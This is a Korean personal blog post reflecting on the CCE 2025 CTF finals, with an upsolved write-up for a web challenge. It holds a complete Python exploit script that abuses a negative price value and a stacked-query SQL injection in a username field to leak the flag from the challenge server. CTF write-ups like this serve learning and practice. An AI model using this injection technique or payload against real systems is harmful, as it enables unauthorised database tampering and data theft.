---
title: "CCE 2025 Finals 소감과 정보자원관리원 WriteUp"
description: "CCE 2025 Finals 소감과 정보자원관리원 WriteUp"
published: 2025-09-16
tags: [ctf]
category: hacking
draft: false
---

# CCE 2025 FINALS
인생 첫 대규모 ctf 본선이었다. 대회장을 들어서자마자 바로 그 생각밖에 안들었던 것 같다. **진짜 커도 너무 컸다**. \
옆자리에는 간간히 얼굴만 알아오던 네임드가 앉아있고 국가에서 주최하는 대회다보니 군복을 입은(곧 나의 미래가 될) 사람들도 많았다.

대회가 시작될쯤 웅장한 사운드가 나의 긴장감을 더해주었다. 그렇게 3시간...

## 0솔
점심을 먹을때까지 쭉 0솔이었다. 큰 대회인만큼 문제가 어려워 0솔을 미리 예상하기는 하였지만 팀에 짐이 된다는 생각에 계속 초조해졌고 최악의 실수를 하게 되었다.
계속 풀이중이던 문제를 버리고 다른 문제로 갈아탄 것이었다. 이러면 안됬었는데... 0솔이 나더라도 ~~어짜피 수상은 못하니까~~ 한문제만 잡고 계속 풀었어야 했다.

그렇게 2시까지 0솔이었다. 이렇게는 안된다고 생각하고 그나마 익숙한 안드로이드를 내세워 android 리버싱... 문제를 하나 해결한 후, 다시 웹에만 집중하였다.

## 전략
방황은 여기까지 전략을 좀 세워보기로 했다. 
방대한 코드양을 가지고있던 취약점 패치 문제인 live fire 문제는 시간이 많이 걸릴 것 같은데 어짜피 시간이 지날수록 점수는 계속 낮아지고 해당 시첨에서 이미 500점정도? 감소된 상태라 풀어도 투자한 시간 대비 얻을 수 있는 점수가 없을 것이라고 생각하였다.

그래서 gpt에게 문제파일을 통채로 넘기고 나는 그나마 솔버가 있었던 정보자원관리원 문제를 풀기 시작했다...

## 바보 멍청이 말미잘
당연히 cce 문제인 만큼 gpt를 이용한 풀이는 쉽지 않았다. 과도하게 많은, 앞단에서 이미 막혀있는 취약점들을 다 찾아서 나한테 보고하였다. 심지어 SLA 테스트가 있어서 gpt한테 코드를 막 수정하라고 할 수 없어, 과감하게 버렸다.
여기까지는 맞는 판단이었던 것 같다.

하지만 정보자원관리원 풀이에서 바보같은 짓을 하고 말았다.

해당 문제에는 - 문자와 sql에 넘겨줄 인자 위치를 결정하는 \$1 문자가 붙어있는 쿼리가 존재하였다. \$1로 음수값을 넘겼다면 --가 완성되어 뒷부분이 주석처리되어 멀티쿼리 형식으로 sqli를 시도할 수 있었다.
하지만 나는 이를 찾아내지 못하고 약간 핀트를 잘못 잡아 \$1\$2 형식으로 붙어있는 경우만 고집하다가 결국 풀이에 실패하였다. 아니 왜 거기에만 몰두했지...

신기하게도 그 부분에 몰두하여 여러가지를 시도해보는데 약 3시간정도 걸렸는데 그 시간이 엄창 짧게 느껴져 다른 방법을 시도해볼 생각을 못하였다. 풀타임으로 이 문제만 잡고 있었다면 달랐을까...

## 업솔빙
아 풀었다

이런

풀고보니 쉬웠다

웹해킹은 항상 이런식이야 ㅡ.ㅡ

그래도 풀때 도파민이 어마어마했다.

와 내가 그래도 2솔짜리 문제를 풀긴 풀었네
하면서..

## 롸업

앞서 말했듯이. -랑 $1이 붙어있는 부분을 잘 찾아서 익스하면 된다.
음수검사가 있긴 한데
익스 보면서 알아서 상상하시길

```python
import re
import random
import requests
from bs4 import BeautifulSoup

UUID_RE = re.compile(r'/market/([0-9a-f-]{36})/(?:buy|donate)')
def get_market_uuid(html: str, target_name: str) -> str | None:
  soup = BeautifulSoup(html, 'html.parser')
  for tr in soup.select('tbody tr'):
    tds = tr.select('td.center')
    if not tds:
      continue
    name = tds[0].get_text(strip=True)
    if name != target_name:
      continue
    for form in tr.find_all('form', action=True):
      m = UUID_RE.search(form['action'])
      if m:
        return m.group(1)
  return None

BASE = "http://192.168.163.3:5011"

# prepare

auther = requests.Session()

auther_email = f"{random.randbytes(5).hex()}@exploit.me"
auther_id = random.randbytes(5).hex()
auther_pw = random.randbytes(5).hex()

print(f"auther_id: {auther_id}")
print(f"auther_pw: {auther_pw}")

auther.post(f"{BASE}/register", {"username": auther_id, "password": auther_pw, "email": auther_email})
auther.post(f"{BASE}/login", {"username": auther_id, "password": auther_pw})

target = random.randbytes(5).hex()
auther.post(f"{BASE}/market/new", {"name": target, "description": "exploit", "price": "1"})

markets = auther.get(f"{BASE}/market").text
target_uid = get_market_uuid(markets, target)

res = auther.post(f"{BASE}/market/{target_uid}/edit", {"name": target, "description": "exploit", "price": "-1", "visible": True})

# exploit
buyer = requests.Session()

leak_price = int(random.randbytes(1).hex(), 16)

buyer_id = random.randbytes(5).hex()
buyer_pw = random.randbytes(5).hex()
buyer_email = f"{auther_id}@exploit.me"

payload = f"\n;UPDATE sales_goods SET name=f.flag FROM (SELECT * from flag) f WHERE price={leak_price} RETURNING 1--{random.randbytes(1).hex()}"

print(f"buyer_id: {buyer_id}")
print(f"buyer_pw: {buyer_pw}")
print(f"payload: \n{payload}")

res1 = buyer.post(f"{BASE}/register", {"username": buyer_id, "password": buyer_pw, "email": buyer_email})
res2 = buyer.post(f"{BASE}/login", {"username": buyer_id, "password": buyer_pw})

res3 = buyer.post(f"{BASE}/market/new", {"name": "flag", "description": "exploit", "price": leak_price})

res4 = buyer.post(f"{BASE}/profile/edit", {"edit_username": payload, "password": buyer_pw, "email": buyer_email})

res5 = buyer.post(f"{BASE}/market/{target_uid}/buy")

print(f"session: {buyer.cookies.get_dict()}")

# print(res.text)
# print(res1.text)
# print(res2.text)
# print(res3.text)
# print(res4.text)
# print(res5.text)
```

# 여담
아니 무슨 다과가 겁나게 많았다. 그냥 오렌지만 통으로 13개에 캐이크만 8조각은 먹은듯\
쿠키는 취향이 아니라 덜먹었다

![img.png](./IMG_1579.jpg)
![img.png](./IMG_1592.jpg)